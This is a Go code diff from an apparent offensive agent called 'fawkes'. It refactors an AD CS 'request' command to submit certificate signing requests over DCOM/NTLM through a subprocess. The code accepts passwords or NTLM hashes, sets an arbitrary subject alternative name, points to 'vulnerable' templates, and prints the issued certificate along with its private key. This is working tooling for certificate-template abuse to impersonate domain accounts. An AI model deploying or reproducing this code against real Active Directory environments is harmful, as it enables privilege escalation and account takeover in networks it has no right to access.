@@ -4,20 +4,18 @@
 package commands
 
 import (
-	"context"
 	"crypto/rand"
 	"crypto/rsa"
 	"crypto/x509"
 	"crypto/x509/pkix"
 	"encoding/asn1"
+	"encoding/base64"
+	"encoding/json"
 	"encoding/pem"
 	"fmt"
 	"strings"
-	"time"
 
 	"fawkes/pkg/structs"
-
-	"github.com/oiweiwei/go-msrpc/ssp/gssapi"
 )
 
 // adcsRequestArgs extends the base adcs args for the request action
@@ -54,13 +52,13 @@ var oidSubjectAltName = asn1.ObjectIdentifier{2, 5, 29, 17}
 // and returns the issued certificate.
 func adcsRequest(args adcsRequestArgs) structs.CommandResult {
 	if args.CAName == "" {
-		return errorResult("Error: ca_name required (e.g., 'CA-NAME' from 'adcs -action cas')")
+		return errorResult("ca_name required (e.g., 'CA-NAME' from 'adcs -action cas')")
 	}
 	if args.Template == "" {
-		return errorResult("Error: template required (e.g., 'User', 'Machine', or a vulnerable template name)")
+		return errorResult("template required (e.g., 'User', 'Machine', or a vulnerable template name)")
 	}
 	if args.Username == "" || (args.Password == "" && args.Hash == "") {
-		return errorResult("Error: username and password (or hash) required for DCOM authentication")
+		return errorResult("username and password (or hash) required for DCOM authentication")
 	}
 	if args.Timeout <= 0 {
 		args.Timeout = 30
@@ -79,52 +77,61 @@ func adcsRequest(args adcsRequestArgs) structs.CommandResult {
 	// Generate RSA key pair
 	key, err := rsa.GenerateKey(rand.Reader, 2048)
 	if err != nil {
-		return errorf("Error generating RSA key: %v", err)
+		return errorf("generating RSA key: %v", err)
 	}
 
 	// Build CSR
 	csrDER, err := adcsBuildCSR(key, args.Subject, args.AltName)
 	if err != nil {
-		return errorf("Error building CSR: %v", err)
+		return errorf("building CSR: %v", err)
 	}
 
-	// Build NTLM credential
-	cred, credErr := rpcCredential(args.Username, args.Domain, args.Password, args.Hash)
+	// Submit CSR via subprocess (DCOM NTLM requires clean process — see go-msrpc-ntlm investigation)
+	subParams, _ := json.Marshal(adcsRequestSubprocessParams{
+		CAName:   args.CAName,
+		Template: args.Template,
+		AltName:  args.AltName,
+		CSRDER:   base64.StdEncoding.EncodeToString(csrDER),
+	})
+	rpcReq := rpcHelperRequest{
+		Operation: "adcs-request",
+		Server:    args.Server,
+		Username:  args.Username,
+		Password:  args.Password,
+		Hash:      args.Hash,
+		Domain:    args.Domain,
+		Timeout:   args.Timeout,
+		Params:    subParams,
+	}
 	zeroCredentials(&args.Password, &args.Hash)
-	if credErr != nil {
-		return errorf("Error: %v", credErr)
+
+	rawResult, err := rpcViaSubprocess(rpcReq)
+	if err != nil {
+		return errorf("submitting certificate request: %v", err)
 	}
 
-	ctx, cancel := context.WithTimeout(gssapi.NewSecurityContext(context.Background()),
-		time.Duration(args.Timeout)*time.Second)
-	defer cancel()
-
-	// Submit CSR via DCOM
-	resp, err := adcsSubmitCSR(ctx, args.Server, args.CAName, args.Template, args.AltName, csrDER, cred)
-	if err != nil {
-		return errorf("Error submitting certificate request: %v", err)
+	var result adcsRequestSubprocessResult
+	if err := json.Unmarshal(rawResult, &result); err != nil {
+		return errorf("parsing DCOM response: %v", err)
 	}
 
 	// Build output
 	var sb strings.Builder
 	sb.WriteString(fmt.Sprintf("CA: %s | Template: %s\n", args.CAName, args.Template))
-	sb.WriteString(fmt.Sprintf("Request ID: %d\n", resp.RequestID))
-	sb.WriteString(fmt.Sprintf("Disposition: %s (0x%08x)\n", adcsDispositionString(resp.Disposition), resp.Disposition))
+	sb.WriteString(fmt.Sprintf("Request ID: %d\n", result.RequestID))
+	sb.WriteString(fmt.Sprintf("Disposition: %s (0x%08x)\n", adcsDispositionString(result.Disposition), result.Disposition))
 
-	if resp.DispositionMessage != nil && len(resp.DispositionMessage.Buffer) > 0 {
-		msg := adcsDecodeUTF16(resp.DispositionMessage.Buffer)
-		if msg != "" {
-			sb.WriteString(fmt.Sprintf("Message: %s\n", msg))
-		}
+	if result.DispositionMessage != "" {
+		sb.WriteString(fmt.Sprintf("Message: %s\n", result.DispositionMessage))
 	}
 
-	switch resp.Disposition {
+	switch result.Disposition {
 	case crDispIssued, crDispIssuedOutOfBand:
-		// Certificate was issued
-		if resp.EncodedCert != nil && len(resp.EncodedCert.Buffer) > 0 {
+		certDER, _ := base64.StdEncoding.DecodeString(result.EncodedCert)
+		if len(certDER) > 0 {
 			certPEM := pem.EncodeToMemory(&pem.Block{
 				Type:  "CERTIFICATE",
-				Bytes: resp.EncodedCert.Buffer,
+				Bytes: certDER,
 			})
 			keyDER := x509.MarshalPKCS1PrivateKey(key)
 			keyPEM := pem.EncodeToMemory(&pem.Block{
@@ -139,8 +146,7 @@ func adcsRequest(args adcsRequestArgs) structs.CommandResult {
 			sb.Write(keyPEM)
 			structs.ZeroBytes(keyPEM)
 
-			// Parse cert for summary
-			if cert, err := x509.ParseCertificate(resp.EncodedCert.Buffer); err == nil {
+			if cert, parseErr := x509.ParseCertificate(certDER); parseErr == nil {
 				sb.WriteString(fmt.Sprintf("\nSubject: %s\n", cert.Subject))
 				sb.WriteString(fmt.Sprintf("Issuer: %s\n", cert.Issuer))
 				sb.WriteString(fmt.Sprintf("Serial: %s\n", cert.SerialNumber))
@@ -160,21 +166,15 @@ func adcsRequest(args adcsRequestArgs) structs.CommandResult {
 		}
 	case crDispUnderSubmission:
 		sb.WriteString("\nCertificate request is PENDING manager approval.\n")
-		sb.WriteString(fmt.Sprintf("Use request ID %d to retrieve it later.\n", resp.RequestID))
+		sb.WriteString(fmt.Sprintf("Use request ID %d to retrieve it later.\n", result.RequestID))
 	default:
 		sb.WriteString("\nCertificate request was DENIED or failed.\n")
 	}
 
-	status := "success"
-	if resp.Disposition != crDispIssued && resp.Disposition != crDispIssuedOutOfBand && resp.Disposition != crDispUnderSubmission {
-		status = "error"
+	if result.Disposition != crDispIssued && result.Disposition != crDispIssuedOutOfBand && result.Disposition != crDispUnderSubmission {
+		return errorResult(sb.String())
 	}
-
-	return structs.CommandResult{
-		Output:    sb.String(),
-		Status:    status,
-		Completed: true,
-	}
+	return successResult(sb.String())
 }
 
 // adcsBuildCSR creates a PKCS#10 certificate signing request.
